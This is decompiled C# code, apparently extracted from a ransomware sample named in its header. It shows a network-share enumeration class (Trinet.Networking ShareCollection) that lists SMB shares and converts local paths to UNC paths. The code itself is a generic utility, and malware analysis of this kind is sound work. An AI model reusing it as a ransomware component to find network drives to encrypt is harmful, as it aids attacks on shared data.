// Decompiled with JetBrains decompiler
// Type: Trinet.Networking.ShareCollection
// Assembly: xaqipaxowq, Version=2.7.3.1, Culture=neutral, PublicKeyToken=null
// MVID: 717542D9-9F58-42E9-9315-5411271D63FD
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-Trojan-Ransom.Win32.Generic-1d16285d88d42a50c89fddfc9f1449b38b3f8e0e680f4b1b57bf88a4143a2812.exe

using System;
using System.Collections;
using System.IO;
using System.Runtime.InteropServices;

namespace Trinet.Networking
{
  public class ShareCollection : ReadOnlyCollectionBase
  {
    protected const int MAX_PATH = 260;
    protected const int NO_ERROR = 0;
    protected const int ERROR_ACCESS_DENIED = 5;
    protected const int ERROR_WRONG_LEVEL = 124;
    protected const int ERROR_MORE_DATA = 234;
    protected const int ERROR_NOT_CONNECTED = 2250;
    protected const int UNIVERSAL_NAME_INFO_LEVEL = 1;
    protected const int MAX_SI50_ENTRIES = 20;
    private static ShareCollection _local;
    private string _server;

    protected static bool IsNT => PlatformID.Win32NT == Environment.OSVersion.Platform;

    protected static bool IsW2KUp
    {
      get
      {
        OperatingSystem osVersion = Environment.OSVersion;
        return PlatformID.Win32NT == osVersion.Platform && osVersion.Version.Major >= 5;
      }
    }

    [DllImport("mpr", CharSet = CharSet.Auto)]
    protected static extern int WNetGetUniversalName(
      string lpLocalPath,
      int dwInfoLevel,
      ref ShareCollection.UNIVERSAL_NAME_INFO lpBuffer,
      ref int lpBufferSize);

    [DllImport("mpr", CharSet = CharSet.Auto)]
    protected static extern int WNetGetUniversalName(
      string lpLocalPath,
      int dwInfoLevel,
      IntPtr lpBuffer,
      ref int lpBufferSize);

    [DllImport("netapi32", CharSet = CharSet.Unicode)]
    protected static extern int NetShareEnum(
      string lpServerName,
      int dwLevel,
      out IntPtr lpBuffer,
      int dwPrefMaxLen,
      out int entriesRead,
      out int totalEntries,
      ref int hResume);

    [DllImport("svrapi", CharSet = CharSet.Ansi)]
    protected static extern int NetShareEnum(
      [MarshalAs(UnmanagedType.LPTStr)] string lpServerName,
      int dwLevel,
      IntPtr lpBuffer,
      ushort cbBuffer,
      out ushort entriesRead,
      out ushort totalEntries);

    [DllImport("netapi32")]
    protected static extern int NetApiBufferFree(IntPtr lpBuffer);

    protected static void EnumerateSharesNT(string server, ShareCollection shares)
    {
      int dwLevel = 2;
      int hResume = 0;
      IntPtr lpBuffer = IntPtr.Zero;
      try
      {
        int entriesRead;
        int totalEntries;
        int num1 = ShareCollection.NetShareEnum(server, dwLevel, out lpBuffer, -1, out entriesRead, out totalEntries, ref hResume);
        if (5 == num1)
        {
          dwLevel = 1;
          num1 = ShareCollection.NetShareEnum(server, dwLevel, out lpBuffer, -1, out entriesRead, out totalEntries, ref hResume);
        }
        if (num1 != 0 || entriesRead <= 0)
          return;
        Type type = 2 == dwLevel ? typeof (ShareCollection.SHARE_INFO_2) : typeof (ShareCollection.SHARE_INFO_1);
        int num2 = Marshal.SizeOf(type);
        int num3 = 0;
        int int32 = lpBuffer.ToInt32();
        while (num3 < entriesRead)
        {
          IntPtr ptr = new IntPtr(int32);
          if (1 == dwLevel)
          {
            ShareCollection.SHARE_INFO_1 structure = (ShareCollection.SHARE_INFO_1) Marshal.PtrToStructure(ptr, type);
            shares.Add(structure.NetName, string.Empty, structure.ShareType, structure.Remark);
          }
          else
          {
            ShareCollection.SHARE_INFO_2 structure = (ShareCollection.SHARE_INFO_2) Marshal.PtrToStructure(ptr, type);
            shares.Add(structure.NetName, structure.Path, structure.ShareType, structure.Remark);
          }
          ++num3;
          int32 += num2;
        }
      }
      finally
      {
        if (IntPtr.Zero != lpBuffer)
          ShareCollection.NetApiBufferFree(lpBuffer);
      }
    }

    protected static void EnumerateShares9x(string server, ShareCollection shares)
    {
      int dwLevel = 50;
      Type type = typeof (ShareCollection.SHARE_INFO_50);
      int num1 = Marshal.SizeOf(type);
      ushort num2 = (ushort) (20 * num1);
      IntPtr num3 = Marshal.AllocHGlobal((int) num2);
      try
      {
        ushort entriesRead;
        ushort totalEntries;
        int num4 = ShareCollection.NetShareEnum(server, dwLevel, num3, num2, out entriesRead, out totalEntries);
        if (124 == num4)
        {
          dwLevel = 1;
          type = typeof (ShareCollection.SHARE_INFO_1_9x);
          num1 = Marshal.SizeOf(type);
          num4 = ShareCollection.NetShareEnum(server, dwLevel, num3, num2, out entriesRead, out totalEntries);
        }
        if (num4 == 0 || 234 == num4)
        {
          int num5 = 0;
          int int32 = num3.ToInt32();
          while (num5 < (int) entriesRead)
          {
            IntPtr ptr = new IntPtr(int32);
            if (1 == dwLevel)
            {
              ShareCollection.SHARE_INFO_1_9x structure = (ShareCollection.SHARE_INFO_1_9x) Marshal.PtrToStructure(ptr, type);
              shares.Add(structure.NetName, string.Empty, structure.ShareType, structure.Remark);
            }
            else
            {
              ShareCollection.SHARE_INFO_50 structure = (ShareCollection.SHARE_INFO_50) Marshal.PtrToStructure(ptr, type);
              shares.Add(structure.NetName, structure.Path, structure.ShareType, structure.Remark);
            }
            ++num5;
            int32 += num1;
          }
        }
        else
          Console.WriteLine(num4);
      }
      finally
      {
        Marshal.FreeHGlobal(num3);
      }
    }

    protected static void EnumerateShares(string server, ShareCollection shares)
    {
      switch (server)
      {
        case "":
        case null:
          if (ShareCollection.IsNT)
          {
            ShareCollection.EnumerateSharesNT(server, shares);
            break;
          }
          ShareCollection.EnumerateShares9x(server, shares);
          break;
        default:
          if (!ShareCollection.IsW2KUp)
          {
            server = server.ToUpper();
            if ('\\' != server[0] || '\\' != server[1])
            {
              server = "\\\\" + server;
              goto case "";
            }
            else
              goto case "";
          }
          else
            goto case "";
      }
    }

    public static bool IsValidFilePath(string fileName)
    {
      switch (fileName)
      {
        case "":
        case null:
          return false;
        default:
          char upper = char.ToUpper(fileName[0]);
          return 'A' <= upper && upper <= 'Z' && (int) Path.VolumeSeparatorChar == (int) fileName[1] && (int) Path.DirectorySeparatorChar == (int) fileName[2];
      }
    }

    public static string PathToUnc(string fileName)
    {
      switch (fileName)
      {
        case "":
        case null:
          return string.Empty;
        default:
          fileName = Path.GetFullPath(fileName);
          if (!ShareCollection.IsValidFilePath(fileName))
            return fileName;
          ShareCollection.UNIVERSAL_NAME_INFO lpBuffer = new ShareCollection.UNIVERSAL_NAME_INFO();
          int lpBufferSize = Marshal.SizeOf((object) lpBuffer);
          int universalName = ShareCollection.WNetGetUniversalName(fileName, 1, ref lpBuffer, ref lpBufferSize);
          if (234 == universalName)
          {
            IntPtr num = Marshal.AllocHGlobal(lpBufferSize);
            try
            {
              universalName = ShareCollection.WNetGetUniversalName(fileName, 1, num, ref lpBufferSize);
              if (universalName == 0)
                lpBuffer = (ShareCollection.UNIVERSAL_NAME_INFO) Marshal.PtrToStructure(num, typeof (ShareCollection.UNIVERSAL_NAME_INFO));
            }
            finally
            {
              Marshal.FreeHGlobal(num);
            }
          }
          switch (universalName)
          {
            case 0:
              return lpBuffer.lpUniversalName;
            case 2250:
              ShareCollection localShares = ShareCollection.LocalShares;
              if (localShares != null)
              {
                Share share = localShares[fileName];
                if (share != null)
                {
                  string path = share.Path;
                  if (path != null && path.Length != 0)
                  {
                    int length = path.Length;
                    if ((int) Path.DirectorySeparatorChar != (int) path[path.Length - 1])
                      ++length;
                    fileName = length >= fileName.Length ? string.Empty : fileName.Substring(length);
                    fileName = Path.Combine(share.ToString(), fileName);
                  }
                }
              }
              return fileName;
            default:
              Console.WriteLine("Unknown return value: {0}", (object) universalName);
              return string.Empty;
          }
      }
    }

    public static Share PathToShare(string fileName)
    {
      switch (fileName)
      {
        case "":
        case null:
          return (Share) null;
        default:
          fileName = Path.GetFullPath(fileName);
          if (!ShareCollection.IsValidFilePath(fileName))
            return (Share) null;
          return ShareCollection.LocalShares?[fileName];
      }
    }

    public static ShareCollection LocalShares
    {
      get
      {
        if (ShareCollection._local == null)
          ShareCollection._local = new ShareCollection();
        return ShareCollection._local;
      }
    }

    public static ShareCollection GetShares(string server) => new ShareCollection(server);

    public ShareCollection()
    {
      this._server = string.Empty;
      ShareCollection.EnumerateShares(this._server, this);
    }

    public ShareCollection(string server)
    {
      this._server = server;
      ShareCollection.EnumerateShares(this._server, this);
    }

    protected void Add(Share share) => this.InnerList.Add((object) share);

    protected void Add(string netName, string path, ShareType shareType, string remark) => this.InnerList.Add((object) new Share(this._server, netName, path, shareType, remark));

    public string Server => this._server;

    public Share this[int index] => (Share) this.InnerList[index];

    public Share this[string path]
    {
      get
      {
        switch (path)
        {
          case "":
          case null:
            return (Share) null;
          default:
            path = Path.GetFullPath(path);
            if (!ShareCollection.IsValidFilePath(path))
              return (Share) null;
            Share share = (Share) null;
            for (int index = 0; index < this.InnerList.Count; ++index)
            {
              Share inner = (Share) this.InnerList[index];
              if (inner.IsFileSystem && inner.MatchesPath(path))
              {
                if (share == null)
                  share = inner;
                else if (share.Path.Length < inner.Path.Length && (inner.ShareType == ShareType.Disk || share.ShareType != ShareType.Disk))
                  share = inner;
              }
            }
            return share;
        }
      }
    }

    public void CopyTo(Share[] array, int index) => this.InnerList.CopyTo((Array) array, index);

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
    protected struct UNIVERSAL_NAME_INFO
    {
      [MarshalAs(UnmanagedType.LPTStr)]
      public string lpUniversalName;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    protected struct SHARE_INFO_2
    {
      [MarshalAs(UnmanagedType.LPWStr)]
      public string NetName;
      public ShareType ShareType;
      [MarshalAs(UnmanagedType.LPWStr)]
      public string Remark;
      public int Permissions;
      public int MaxUsers;
      public int CurrentUsers;
      [MarshalAs(UnmanagedType.LPWStr)]
      public string Path;
      [MarshalAs(UnmanagedType.LPWStr)]
      public string Password;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    protected struct SHARE_INFO_1
    {
      [MarshalAs(UnmanagedType.LPWStr)]
      public string NetName;
      public ShareType ShareType;
      [MarshalAs(UnmanagedType.LPWStr)]
      public string Remark;
    }

    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    protected struct SHARE_INFO_50
    {
      [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 13)]
      public string NetName;
      public byte bShareType;
      public ushort Flags;
      [MarshalAs(UnmanagedType.LPTStr)]
      public string Remark;
      [MarshalAs(UnmanagedType.LPTStr)]
      public string Path;
      [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 9)]
      public string PasswordRW;
      [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 9)]
      public string PasswordRO;

      public ShareType ShareType => (ShareType) ((int) this.bShareType & (int) sbyte.MaxValue);
    }

    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    protected struct SHARE_INFO_1_9x
    {
      [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 13)]
      public string NetName;
      public byte Padding;
      public ushort bShareType;
      [MarshalAs(UnmanagedType.LPTStr)]
      public string Remark;

      public ShareType ShareType => (ShareType) ((int) this.bShareType & (int) short.MaxValue);
    }
  }
}
